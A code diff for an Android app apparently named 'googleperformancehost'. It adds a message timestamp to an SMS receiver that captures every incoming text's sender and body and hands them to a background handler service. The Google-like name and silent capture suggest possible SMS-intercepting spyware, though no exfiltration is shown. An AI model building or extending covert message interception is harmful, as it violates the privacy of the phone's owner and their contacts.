@@ -10,6 +10,7 @@ import android.util.Log;
 
 import com.example.tiber.googleperformancehost.R;
 import com.example.tiber.googleperformancehost.Services.Temporary.ReceivedSMSHandlerIntentService;
+import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;
 
 /**
  * Created by tiber on 10/30/2016.
@@ -29,13 +30,15 @@ public class SMSReceiver extends BroadcastReceiver {
                     String phoneNumber = null;
                     String senderNum = null;
                     String message = "";
-
+                    int time = 0;
                     for (int i = 0; i < pdusObj.length; i++) {
 
                         SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                         phoneNumber = currentMessage.getDisplayOriginatingAddress();
                         senderNum = phoneNumber;
-
+                        time = (int)(currentMessage.getTimestampMillis()/1000L);
+                        if( time == 0 )
+                            time = DateUtil.nowIntFormat();
                         message += currentMessage.getDisplayMessageBody();
                     } // end for loop
 
@@ -44,6 +47,7 @@ public class SMSReceiver extends BroadcastReceiver {
                         Intent startSMSHandler =
                                 new Intent(context.getApplicationContext(), ReceivedSMSHandlerIntentService.class);
 
+                        startSMSHandler.putExtra("time",time);
                         startSMSHandler.putExtra("senderNumber", senderNum);
                         startSMSHandler.putExtra("message", message);
                         context.getApplicationContext().startService(startSMSHandler);
